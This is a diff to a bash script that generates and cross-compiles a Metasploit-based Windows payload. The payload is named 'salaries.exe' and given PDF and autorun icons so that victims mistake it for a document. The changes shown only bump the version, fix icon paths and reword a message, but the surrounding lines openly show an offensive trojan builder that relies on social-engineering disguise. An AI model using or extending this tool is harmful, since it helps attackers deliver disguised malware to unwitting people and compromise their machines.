@@ -27,7 +27,7 @@ OUTPUTNAME="salaries.exe" # The payload exe created name
 # Script begins
 #===============================================================================
 
-VERSION="1.4"
+VERSION="1.5"
 
 # spinner for Metasploit Generator
 spinlong ()
@@ -98,13 +98,13 @@ fi
 
 #Check for PDF icon files
 
-ls /icons/icon.res >/dev/null 2>&1 && ls /icons/autorun.ico >/dev/null 2>&1
+ls icons/icon.res >/dev/null 2>&1 && ls icons/autorun.ico >/dev/null 2>&1
 if [ $? -eq 0 ]
 	then
 		echo ""
 	else
 		echo ""
-		echo -e "\e[01;31m[!]\e[00m I can't find the icon files I will need, I will try and just download this for you from the internet"
+		echo -e "\e[01;31m[!]\e[00m I can't find the icon files I will need, I will try and download these now"
 		echo ""
 		sleep 2
 		echo ""
@@ -272,7 +272,7 @@ echo '}' >> build.c
 
 # gcc compile the exploit
 
-ls icon.res >/dev/null 2>&1
+ls icons/icon.res >/dev/null 2>&1
 	if [ $? -eq 0 ]
 		then
 			i586-mingw32msvc-gcc -Wall -mwindows icons/icon.res build.c -o "$OUTPUTNAME"
